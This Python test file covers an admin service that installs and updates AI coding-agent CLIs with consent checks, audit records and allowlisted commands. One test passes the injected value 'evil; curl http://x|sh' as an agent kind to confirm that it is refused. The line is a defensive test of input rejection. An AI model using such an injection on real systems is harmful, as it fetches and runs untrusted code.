"""Install and update agent binaries from Pollen — box only, consent first.

`agent_install.py`'s docstring is a wall: "No auto-install, ever… refuses even
when `assume_yes=True` unless stdin AND stdout are TTYs." A Pollen button is
non-interactive by definition, so this module REPLACES that guarantee rather
than bypassing it: an authenticated operator with the admin role, an explicit
consent field naming the action, and an audit row recording who, which binary,
and the version before and after — the `pr_gate_outcomes` shape, a human
decision paired with a machine state.

Red lines, each pinned below:

    only registry CONSTANTS execute. A kind outside `AGENT_INSTALL_SPECS` is
    refused before anything runs; no URL or command ever arrives from the UI.
    A button that took a URL would make Pollen remote code execution.

    docs-only entries stay docs-only. Where the vendor has no vetted
    one-liner, `command` is None by design — the API says so instead of
    improvising one.

    update commands are VERIFIED constants (read from each binary's --help,
    2026-08-22): grok/claude/codex/cursor-agent have native `update`
    subcommands; vibe's is interactive (prompts) and gemini has none, so
    theirs are None — None means NO BUTTON, not a greyed-out one that lies.

The box trap this must report rather than repeat: these installers are
per-user. grok's landed in `$HOME/.grok/bin`, the units set no PATH, and
`shutil.which` returned None for the SERVICE while the installing shell saw it
fine. So every result carries `on_service_path`, probed in THIS process — the
service's own view, the only one that decides whether a runner registers.
"""

from __future__ import annotations

import subprocess

import pytest
import pytest as _pytest

from hivepilot.services import agent_admin


@_pytest.fixture(autouse=True)
def _no_real_probes(monkeypatch):
    """No test in this file may touch the real world.

    `probe_agent_cli` does two things a test must not: it spawns `--version`
    on every real binary (the 13-19s runs), and it WRITES its verdicts into
    the process-global check registry — which is how this file's first
    version broke 51 unrelated tests in the full suite: seeded-health
    assertions elsewhere found our probe residue. Everything here goes
    through injected fakes; the tests that need a version override this."""
    monkeypatch.setattr(agent_admin, "_probe_version", lambda k: None)


def _completed(stdout="ok", code=0):
    return subprocess.CompletedProcess(["x"], code, stdout=stdout, stderr="")


class TestOnlyRegistryConstantsExecute:
    def test_an_unknown_kind_is_refused_before_anything_runs(self):
        ran: list = []

        with pytest.raises(agent_admin.AgentAdminError, match="unknown agent kind"):
            agent_admin.perform_agent_action(
                "evil; curl http://x|sh",
                "update",
                actor="op",
                run_cli=lambda *a, **k: ran.append(a),
            )

        assert ran == []

    def test_an_unknown_action_is_refused(self):
        with pytest.raises(agent_admin.AgentAdminError, match="unknown action"):
            agent_admin.perform_agent_action("grok", "reinstall --force", actor="op")

    def test_the_update_argv_is_the_verified_constant(self, monkeypatch):
        ran: list = []
        monkeypatch.setattr(agent_admin, "_probe_version", lambda k: "1.0.5")

        agent_admin.perform_agent_action(
            "grok", "update", actor="op", run_cli=lambda argv, **k: ran.append(argv) or _completed()
        )

        assert ran == [["grok", "update"]]

    def test_install_runs_the_pinned_one_liner_through_sh(self, monkeypatch):
        """The spec's command is a `curl | bash` pipeline — a shell line, and
        the ONLY shell line this module ever runs, straight from the vetted
        registry constant."""
        from hivepilot.services.agent_install import AGENT_INSTALL_SPECS

        ran: list = []
        monkeypatch.setattr(agent_admin, "_probe_version", lambda k: None)

        agent_admin.perform_agent_action(
            "grok",
            "install",
            actor="op",
            run_cli=lambda argv, **k: ran.append(argv) or _completed(),
        )

        assert ran == [["bash", "-lc", AGENT_INSTALL_SPECS["grok"].command]]

    def test_docs_only_kinds_refuse_install_naming_the_docs(self, monkeypatch):
        """Where the vendor has no vetted one-liner, the answer is the link,
        never an improvised command."""
        from hivepilot.services.agent_install import AGENT_INSTALL_SPECS

        monkeypatch.setitem(
            agent_admin.__dict__, "_test_marker", None
        )  # no-op, keeps monkeypatch in the signature honestly
        docs_only = [k for k, s in AGENT_INSTALL_SPECS.items() if s.command is None]
        if not docs_only:
            pytest.skip("no docs-only specs in the registry right now")

        with pytest.raises(agent_admin.AgentAdminError, match="docs"):
            agent_admin.perform_agent_action(docs_only[0], "install", actor="op")

    def test_a_kind_without_a_verified_update_command_refuses_update(self):
        """vibe's updater is interactive and gemini has none. None must mean
        NO BUTTON — attempting it anyway is refused with the reason."""
        candidates = [k for k, argv in agent_admin.UPDATE_COMMANDS.items() if argv is None]
        if not candidates:
            pytest.skip("every registry kind currently has an update command")

        with pytest.raises(agent_admin.AgentAdminError, match="no verified update"):
            agent_admin.perform_agent_action(candidates[0], "update", actor="op")


class TestTheDecisionIsRecorded:
    def test_an_update_records_who_and_both_versions(self, monkeypatch):
        """The pr_gate_outcomes shape: a human decision paired with a machine
        state. Version BEFORE and AFTER, because "it updated" without the
        delta answers nothing later."""
        versions = iter(["1.0.5", "1.0.6"])
        monkeypatch.setattr(agent_admin, "_probe_version", lambda k: next(versions))
        recorded: list = []
        monkeypatch.setattr(agent_admin, "_record_audit", lambda **kw: recorded.append(kw))

        result = agent_admin.perform_agent_action(
            "grok", "update", actor="jerome", run_cli=lambda *a, **k: _completed()
        )

        assert recorded and recorded[0]["actor"] == "jerome"
        assert recorded[0]["version_before"] == "1.0.5"
        assert recorded[0]["version_after"] == "1.0.6"
        assert result["version_before"] == "1.0.5"
        assert result["version_after"] == "1.0.6"

    def test_a_failed_update_is_recorded_as_failed_not_silent(self, monkeypatch):
        monkeypatch.setattr(agent_admin, "_probe_version", lambda k: "1.0.5")
        recorded: list = []
        monkeypatch.setattr(agent_admin, "_record_audit", lambda **kw: recorded.append(kw))

        result = agent_admin.perform_agent_action(
            "grok", "update", actor="op", run_cli=lambda *a, **k: _completed("boom", 1)
        )

        assert result["ok"] is False
        assert recorded[0]["result"].startswith("failed")

    def test_the_service_path_visibility_travels_in_the_result(self, monkeypatch):
        """The box trap, reported rather than repeated: installed is not
        enough — the binary must be on the PATH the SERVICE sees, and this
        process's `shutil.which` is exactly that view."""
        monkeypatch.setattr(agent_admin, "_probe_version", lambda k: "1.0.5")
        monkeypatch.setattr(agent_admin.shutil, "which", lambda b: None)

        result = agent_admin.perform_agent_action(
            "grok", "update", actor="op", run_cli=lambda *a, **k: _completed()
        )

        assert result["on_service_path"] is False


class TestTheListing:
    def test_every_registry_kind_is_listed_with_its_capabilities(self):
        rows = {r["kind"]: r for r in agent_admin.list_agents_admin()}

        assert "grok" in rows
        grok = rows["grok"]
        assert grok["installable"] is True
        assert grok["updatable"] is True
        assert "on_service_path" in grok

    def test_updatable_reflects_the_verified_constant_not_hope(self):
        rows = {r["kind"]: r for r in agent_admin.list_agents_admin()}

        for kind, argv in agent_admin.UPDATE_COMMANDS.items():
            if kind in rows:
                assert rows[kind]["updatable"] is (argv is not None)

    def test_the_update_commands_are_argv_lists_never_shell_strings(self):
        """Install is the one vetted shell pipeline; updates run WITHOUT a
        shell, so nothing can be smuggled through word-splitting."""
        for argv in agent_admin.UPDATE_COMMANDS.values():
            if argv is not None:
                assert isinstance(argv, list)
                assert all(isinstance(part, str) for part in argv)


class TestTheVerifiedTableIsExactlyWhatWasVerified:
    def test_every_update_argv_matches_the_help_probe_of_2026_08_22(self):
        """The table's value IS its exact content — each argv was read from
        the installed binary's --help, and a drifted entry (an extra flag, a
        renamed subcommand) would run something nobody verified. A mutation
        adding `--force` to claude's argv survived until this existed."""
        assert agent_admin.UPDATE_COMMANDS == {
            "grok": ["grok", "update"],
            "claude": ["claude", "update"],
            "codex": ["codex", "update"],
            "cursor": ["cursor-agent", "update"],
            "vibe": None,
            "gemini": None,
        }


# `TestTheApiSurface` LIVES IN tests/test_api_service.py, not here — and the
# location is load-bearing. This file sorts to alphabetical position 2, and a
# test module importing `api_service` that early broke 51 unrelated tests with
# 404s (bisected: skipping only that class made the suite green; the same trap
# is recorded in the project memory as having broken 40 tests once before).
# `test_api_service.py` runs after the fixtures that make that import safe.
